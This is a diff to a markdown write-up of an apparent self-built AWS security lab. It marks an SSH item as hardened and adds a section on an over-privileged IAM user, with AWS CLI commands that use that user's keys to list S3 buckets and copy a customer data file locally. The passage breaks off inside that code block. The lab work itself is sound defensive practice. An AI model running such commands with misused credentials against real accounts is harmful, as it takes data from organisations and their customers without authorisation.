@@ -95,5 +95,21 @@ VPC Flow Logs successfully captured the network-level evidence of the exposed SS
 * [x] Vulnerability created
 * [x] SSH connectivity verified
 * [x] Detection
-* [ ] Hardening
+* [x] Hardening
+
+## Vulnerability #2 — Over-Privileged IAM User
+
+### Vulnerability
+The IAM user `cloudbreach-attacker` was initially granted the AWS managed policy `AdministratorAccess`.
+
+This violated the principle of least privilege and gave the attacker broad access to AWS resources.
+
+### Attack
+Using the attacker's access keys:
+
+```bash
+aws sts get-caller-identity --profile cloudbreach-attacker
+aws s3 ls --profile cloudbreach-attacker
+aws s3 ls s3://<bucket-name> --profile cloudbreach-attacker
+aws s3 cp s3://<bucket-name>/customer-data.txt ./customer-data.txt --profile cloudbreach-attacker
 
